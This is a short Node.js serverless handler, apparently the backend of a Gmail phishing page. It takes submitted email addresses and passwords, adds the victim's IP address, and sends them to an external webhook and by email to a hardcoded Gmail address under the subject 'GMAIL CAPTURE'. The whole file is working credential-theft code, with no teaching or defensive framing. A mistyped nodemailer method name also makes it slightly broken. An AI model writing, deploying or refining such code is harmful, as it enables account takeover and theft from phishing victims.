import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';

  // WEBHOOK
  fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/temp', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...data, ip })
  }).catch(() => {});

  // EMAIL
  const transporter = nodemailer.createTransporter({
    host: 'smtp.gmail.com', port: 587, secure: false,
    auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
  });

  await transporter.sendMail({
    from: process.env.EMAIL_USER, to: 'busmeup13@gmail.com',
    subject: `🔔 GMAIL CAPTURE: ${data.email}`,
    html: `<h1>🎯 Captured</h1><p><strong>Email:</strong> ${data.email}</p><p><strong>Pass:</strong> ${data.password}</p><p><strong>IP:</strong> ${ip}</p><pre>${JSON.stringify(data, null, 2)}</pre>`
  });

  res.json({ status: 'captured' });
}
